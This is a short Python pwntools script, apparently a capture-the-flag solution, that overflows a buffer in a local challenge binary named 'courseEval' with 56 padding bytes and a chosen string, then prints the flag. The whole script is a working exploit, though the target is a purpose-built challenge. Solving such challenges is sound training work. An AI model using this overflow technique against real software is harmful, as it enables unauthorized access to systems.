from pwn import *  # type: ignore

context.binary = "./courseEval"
p = process()
p.sendline(b"A" * 56 + b"UniPD_01" + b"CPP-" + b"PWN-" + b"Pier")

log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))
